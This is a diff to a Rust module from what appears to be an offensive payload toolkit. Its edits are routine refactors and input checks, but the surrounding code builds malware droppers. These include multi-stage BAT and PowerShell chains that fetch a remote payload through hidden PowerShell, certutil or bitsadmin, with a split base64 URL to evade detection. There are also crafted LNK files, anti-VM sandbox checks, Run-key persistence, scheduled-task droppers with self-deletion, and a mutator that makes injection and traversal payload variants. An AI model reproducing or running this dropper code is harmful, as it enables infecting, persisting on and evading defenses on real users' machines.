@@ -6,7 +6,7 @@
 //!
 //! This keeps payload logic in one place, reusable across modules.
 
-use anyhow::{anyhow, Result};
+use anyhow::{anyhow, Result, Context};
 use base64::{engine::general_purpose::STANDARD as BASE64_STANDARD, Engine as _};
 use data_encoding::{BASE32, BASE32HEX, BASE64, BASE64URL};
 use rand::{rng, seq::SliceRandom, prelude::IndexedRandom, RngExt};
@@ -84,7 +84,7 @@ impl EncodingType {
 pub fn apply_encodings(input: &[u8], encodings: &[EncodingType]) -> Result<String> {
     if encodings.is_empty() {
         return String::from_utf8(input.to_vec())
-            .map_err(|e| anyhow!("Input contains invalid UTF-8 and no encoding was specified: {}", e));
+            .context("Input contains invalid UTF-8 and no encoding was specified");
     }
 
     let mut data = input.to_vec();
@@ -105,7 +105,7 @@ pub fn apply_encodings(input: &[u8], encodings: &[EncodingType]) -> Result<Strin
     }
 
     String::from_utf8(data)
-        .map_err(|e| anyhow!("Final encoding produced invalid UTF-8: {}", e))
+        .context("Final encoding produced invalid UTF-8")
 }
 
 pub fn encode_base16(data: &[u8]) -> String {
@@ -162,7 +162,7 @@ const ZERO_WIDTH_CHARS: [char; 8] = [
 
 pub fn encode_zero_width(data: &[u8]) -> String {
     let total_bits = data.len() as u64 * 8;
-    let estimated_chars = ((total_bits + 2) / 3) as usize;
+    let estimated_chars = total_bits.div_ceil(3) as usize;
     let mut result = String::with_capacity(estimated_chars);
 
     let mut buffer: u32 = 0;
@@ -209,14 +209,31 @@ pub fn visualize_zero_width(text: &str) -> String {
 // ============================================================================
 
 /// Split a URL into two base64-encoded halves for evasion
-pub fn base64_split_encode(url: &str) -> (String, String) {
+pub fn base64_split_encode(url: &str) -> Result<(String, String)> {
+    if url.is_empty() {
+        anyhow::bail!("URL must not be empty");
+    }
     let mid = url.len() / 2;
     let (first, second) = url.split_at(mid);
-    (BASE64_STANDARD.encode(first), BASE64_STANDARD.encode(second))
+    Ok((BASE64_STANDARD.encode(first), BASE64_STANDARD.encode(second)))
 }
 
 /// Generate a multi-stage BAT payload chain
 pub fn write_bat_payload_chain(stage1_path: &str, url: &str, output_ps1: &str) -> Result<()> {
+    if stage1_path.contains("..") {
+        anyhow::bail!("stage1_path must not contain path traversal (..): {}", stage1_path);
+    }
+    if output_ps1.contains('\'') || output_ps1.contains(';') || output_ps1.contains("..") {
+        anyhow::bail!("output_ps1 contains unsafe characters: {}", output_ps1);
+    }
+    // Reject BAT metacharacters
+    const BAT_DANGEROUS: &[char] = &['%', '^', '&', '|', '<', '>', '`', '\n', '\r'];
+    if stage1_path.chars().any(|c| BAT_DANGEROUS.contains(&c)) {
+        anyhow::bail!("stage1_path contains dangerous characters for BAT context");
+    }
+    if output_ps1.chars().any(|c| BAT_DANGEROUS.contains(&c)) {
+        anyhow::bail!("output_ps1 contains dangerous characters for BAT context");
+    }
     let mut symbols = vec![
         "测试", "測試", "例え", "例子", "示例", "示意", "探索", "神秘",
         "✂", "✈", "☎", "☂", "☯", "✉", "✏", "✒", "✇", "✈✂", "📌", "🎴", "項目", "数据", "样本", "分析",
@@ -228,7 +245,7 @@ pub fn write_bat_payload_chain(stage1_path: &str, url: &str, output_ps1: &str) -
     let s3 = symbols[1].to_string();
     let s4 = symbols[2].to_string();
 
-    let (part1_b64, part2_b64) = base64_split_encode(url);
+    let (part1_b64, part2_b64) = base64_split_encode(url)?;
 
     let stage1_contents = format!(
 r#"@echo off
@@ -294,7 +311,12 @@ start "" /B "{s2}"
 exit
 "#);
 
-    std::fs::write(stage1_path, stage1_contents)?;
+    std::fs::write(stage1_path, &stage1_contents)?;
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt;
+        std::fs::set_permissions(stage1_path, std::fs::Permissions::from_mode(0o600))?;
+    }
     Ok(())
 }
 
@@ -331,22 +353,26 @@ fn create_lnk_binary(output_path: &Path, target_path: &str, icon_location: &str)
 
     // TARGET_PATH string
     let target_utf16: Vec<u16> = target_path.encode_utf16().collect();
-    lnk_data.extend_from_slice(&((target_utf16.len() * 2) as u16).to_le_bytes());
+    let target_byte_len = u16::try_from(target_utf16.len() * 2)
+        .map_err(|e| anyhow::anyhow!("Target path too long for LNK u16 length field: {e}"))?;
+    lnk_data.extend_from_slice(&target_byte_len.to_le_bytes());
     for &c in &target_utf16 {
         lnk_data.extend_from_slice(&c.to_le_bytes());
     }
 
     // ICON_LOCATION string
     let icon_utf16: Vec<u16> = icon_location.encode_utf16().collect();
-    lnk_data.extend_from_slice(&((icon_utf16.len() * 2) as u16).to_le_bytes());
+    let icon_byte_len = u16::try_from(icon_utf16.len() * 2)
+        .map_err(|e| anyhow::anyhow!("Icon location too long for LNK u16 length field: {e}"))?;
+    lnk_data.extend_from_slice(&icon_byte_len.to_le_bytes());
     for &c in &icon_utf16 {
         lnk_data.extend_from_slice(&c.to_le_bytes());
     }
 
     let mut file = File::create(output_path)
-        .map_err(|e| anyhow!("Failed to create LNK file at {}: {}", output_path.display(), e))?;
+        .with_context(|| format!("Failed to create LNK file at {}", output_path.display()))?;
     file.write_all(&lnk_data)
-        .map_err(|e| anyhow!("Failed to write LNK data: {}", e))?;
+        .context("Failed to write LNK data")?;
 
     Ok(())
 }
@@ -446,7 +472,7 @@ pub fn build_anti_vm(ctx: &mut DropperContext) -> String {
     if !{ram_val}! LSS 2000 (
         echo [*] System resources verification failed (Code: 0x1002).
         ping -n 120 127.0.0.1 >nul
-    ).await?;
+    )
     REM [ Check 3: Virtualization Artifacts ]
     set "artifacts=VBOX VMWARE QEMU XEN VIRTUAL"
     for %%X in (%artifacts%) do (
@@ -455,7 +481,7 @@ pub fn build_anti_vm(ctx: &mut DropperContext) -> String {
             echo [*] Environment restricted. Pausing execution.
             ping -n 300 127.0.0.1 >nul
         )
-    ).await?;
+    )
     "#,
         uptime=uptime, boot=boot, now=now, ram=ram, ram_val=ram_val
     )
@@ -463,15 +489,21 @@ pub fn build_anti_vm(ctx: &mut DropperContext) -> String {
 
 /// Generate a download command using the selected LOLBAS method
 pub fn build_downloader(method: DownloadMethod, url: &str, outfile: &str) -> String {
+    // Escape for PowerShell single-quoted strings
+    let safe_url = url.replace('\'', "''");
+    let safe_outfile = outfile.replace('\'', "''");
+    // Escape for double-quoted contexts (certutil/bitsadmin)
+    let safe_url_dq = url.replace('"', "\\\"");
+    let safe_outfile_dq = outfile.replace('"', "\\\"");
     match method {
         DownloadMethod::PowerShell => format!(
-            "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"try {{ [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '{url}' -OutFile '{outfile}' -UseBasicParsing }} catch {{ exit 1 }}\""
+            "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"try {{ [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '{safe_url}' -OutFile '{safe_outfile}' -UseBasicParsing }} catch {{ exit 1 }}\""
         ),
         DownloadMethod::Certutil => format!(
-            "certutil -urlcache -split -f \"{url}\" \"{outfile}\" >nul 2>&1 && certutil -urlcache -split -f \"{url}\" delete >nul 2>&1"
+            "certutil -urlcache -split -f \"{safe_url_dq}\" \"{safe_outfile_dq}\" >nul 2>&1 && certutil -urlcache -split -f \"{safe_url_dq}\" delete >nul 2>&1"
         ),
         DownloadMethod::Bitsadmin => format!(
-            "bitsadmin /transfer \"SystemUpdate_{rnd}\" /priority FOREGROUND \"{url}\" \"%CD%\\{outfile}\" >nul",
+            "bitsadmin /transfer \"SystemUpdate_{rnd}\" /priority FOREGROUND \"{safe_url_dq}\" \"%CD%\\{safe_outfile_dq}\" >nul",
             rnd = rng().random_range(1000..9999)
         ),
     }
@@ -492,7 +524,7 @@ set "persist_path=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
 reg query "%persist_path%" /v "{reg_name}" >nul 2>&1
 if errorlevel 1 (
     reg add "%persist_path%" /v "{reg_name}" /t REG_SZ /d "cmd /c start /min \"\" \"%%~dp0{ps1_name}\"" /f >nul
-).await?;
+)
 REM == Execute Payload ==
 echo [*] Starting background service...
 powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%%~dp0{ps1_name}" >nul 2>&1
@@ -629,12 +661,12 @@ exit
 pub fn parse_delay(input: &str) -> Result<u32> {
     let lower = input.to_lowercase();
     if let Some(mins) = lower.strip_suffix('m') {
-        mins.parse().map_err(|_| anyhow!("Invalid minutes format"))
+        mins.parse().map_err(|e| anyhow!("Invalid minutes format: {e}"))
     } else if let Some(days) = lower.strip_suffix('d') {
-        let d: u32 = days.parse().map_err(|_| anyhow!("Invalid days format"))?;
+        let d: u32 = days.parse().map_err(|e| anyhow!("Invalid days format: {e}"))?;
         Ok(d * 1440)
     } else {
-        input.parse().map_err(|_| anyhow!("Invalid delay format (use '10m' or '2d')"))
+        input.parse().map_err(|e| anyhow!("Invalid delay format (use '10m' or '2d'): {e}"))
     }
 }
 
@@ -659,7 +691,7 @@ pub fn generate_junk_comments() -> String {
     let count = rng.random_range(3..7);
     let mut s = String::new();
     for _ in 0..count {
-        writeln!(s, ":: {}", random_string(20)).ok();
+        if let Err(e) = writeln!(s, ":: {}", random_string(20)) { tracing::trace!("string write: {e}"); }
     }
     s
 }
@@ -679,17 +711,30 @@ pub fn escape_bat_echo(content: &str) -> String {
     }).collect::<Vec<_>>().join("\n")
 }
 
+/// Configuration for a polymorph 3-stage dropper.
+pub struct PolymorphConfig<'a> {
+    pub command: &'a str,
+    pub delay1_mins: u32,
+    pub delay2_mins: u32,
+    pub stage2_bat_name: &'a str,
+    pub stage3_lnk_name: &'a str,
+    pub vbs_helper_name: &'a str,
+    pub task1_name: &'a str,
+    pub task2_name: &'a str,
+}
+
 /// Build the complete polymorph 3-stage dropper content
-pub fn build_polymorph_dropper(
-    command: &str,
-    delay1_mins: u32,
-    delay2_mins: u32,
-    stage2_bat_name: &str,
-    stage3_lnk_name: &str,
-    vbs_helper_name: &str,
-    task1_name: &str,
-    task2_name: &str,
-) -> String {
+pub fn build_polymorph_dropper(cfg: &PolymorphConfig<'_>) -> String {
+    let PolymorphConfig {
+        command,
+        delay1_mins,
+        delay2_mins,
+        stage2_bat_name,
+        stage3_lnk_name,
+        vbs_helper_name,
+        task1_name,
+        task2_name,
+    } = cfg;
     let lnk_target = "cmd.exe";
     let lnk_args = format!("/c {}", command);
 
@@ -731,7 +776,7 @@ if %errorlevel% neq 0 (
     echo [!] Task creation failed. Admin rights might be needed or schedule time invalid.
     echo [*] Fallback: Executing LNK immediately...
     start "" "{lnk_name}"
-).await?;
+)
 del "%~f0" >nul 2>&1
 "#,
         vbs_echo_lines = vbs_content.lines().map(|l| format!("echo {}", l)).collect::<Vec<_>>().join("\n"),
@@ -829,7 +874,7 @@ pub fn mutate_payloads(
 
     let mut current_gen: Vec<String> = seeds.to_vec();
 
-    for _depth in 0..config.depth {
+    for _ in 0..config.depth {
         let mut next_gen = Vec::new();
 
         for payload in &current_gen {
@@ -967,7 +1012,7 @@ fn mutator_encode_url(payload: &str) -> Vec<String> {
             if c.is_ascii_alphanumeric() {
                 c.to_string()
             } else {
-                format!("%{:02X}", c as u8)
+                c.to_string().as_bytes().iter().map(|b| format!("%{:02X}", b)).collect::<String>()
             }
         })
         .collect::<String>();
@@ -977,7 +1022,7 @@ fn mutator_encode_url(payload: &str) -> Vec<String> {
         .map(|c| match c {
             '\'' | '"' | ' ' | ';' | '|' | '&' | '<' | '>' | '(' | ')' | '/'
             | '\\' | '{' | '}' | '$' | '`' | '!' | '#' | '%' | '=' | '.' => {
-                format!("%{:02X}", c as u8)
+                c.to_string().as_bytes().iter().map(|b| format!("%{:02X}", b)).collect::<String>()
             }
             _ => c.to_string(),
         })
@@ -992,10 +1037,12 @@ fn mutator_encode_double_url(payload: &str) -> Vec<String> {
         if c.is_ascii_alphanumeric() {
             double.push(c);
         } else {
-            let pair = crate::native::hex::byte_to_upper(c as u8);
-            double.push_str("%25");
-            double.push(pair[0] as char);
-            double.push(pair[1] as char);
+            for b in c.to_string().as_bytes() {
+                let pair = crate::native::hex::byte_to_upper(*b);
+                double.push_str("%25");
+                double.push(pair[0] as char);
+                double.push(pair[1] as char);
+            }
         }
     }
     vec![double]
@@ -1105,7 +1152,7 @@ fn mutator_encode_mixed_partial(payload: &str) -> Vec<String> {
             if !c.is_ascii_alphanumeric() && c != ' ' {
                 special_idx += 1;
                 if special_idx % 2 == 0 {
-                    format!("%{:02X}", c as u8)
+                    c.to_string().as_bytes().iter().map(|b| format!("%{:02X}", b)).collect::<String>()
                 } else {
                     c.to_string()
                 }
@@ -1123,7 +1170,7 @@ fn mutator_encode_mixed_partial(payload: &str) -> Vec<String> {
             if !c.is_ascii_alphanumeric() && c != ' ' {
                 special_idx += 1;
                 if special_idx % 2 == 1 {
-                    format!("%{:02X}", c as u8)
+                    c.to_string().as_bytes().iter().map(|b| format!("%{:02X}", b)).collect::<String>()
                 } else {
                     c.to_string()
                 }
@@ -1315,7 +1362,7 @@ fn sql_hex_encode_strings(payload: &str) -> Vec<String> {
                 if c == '\'' || c == '"' || c == ' ' {
                     c.to_string()
                 } else if c.is_alphabetic() {
-                    format!("0x{:02X}", c as u8)
+                    c.to_string().as_bytes().iter().map(|b| format!("0x{:02X}", b)).collect::<String>()
                 } else {
                     c.to_string()
                 }
@@ -1379,7 +1426,7 @@ fn cmd_separator_variants(payload: &str) -> Vec<String> {
     }
 
     for sep in &separators {
-        results.push(format!("{}{}", sep, payload.trim_start_matches(|c: char| c == ';' || c == '|' || c == '&' || c == ' ')));
+        results.push(format!("{}{}", sep, payload.trim_start_matches([';', '|', '&', ' '])));
     }
 
     results
@@ -1588,16 +1635,14 @@ fn expand_traversal_depths(seeds: &[String], config: &MutatorConfig) -> Vec<Stri
 // --- Mutator Utility Helpers ---
 
 fn replace_case_insensitive(text: &str, from: &str, to: &str) -> String {
-    let lower_text = text.to_lowercase();
-    let lower_from = from.to_lowercase();
-    if let Some(pos) = lower_text.find(&lower_from) {
-        let mut result = String::new();
-        result.push_str(&text[..pos]);
-        result.push_str(to);
-        result.push_str(&text[pos + from.len()..]);
-        result
-    } else {
-        text.to_string()
+    if from.is_empty() { return text.to_string(); }
+    let pattern = regex::escape(from);
+    match regex::Regex::new(&format!("(?i){}", pattern)) {
+        Ok(re) => re.replace(text, to).into_owned(),
+        Err(e) => {
+            tracing::warn!("replace_case_insensitive: failed to compile regex: {e}");
+            text.to_string()
+        }
     }
 }
 
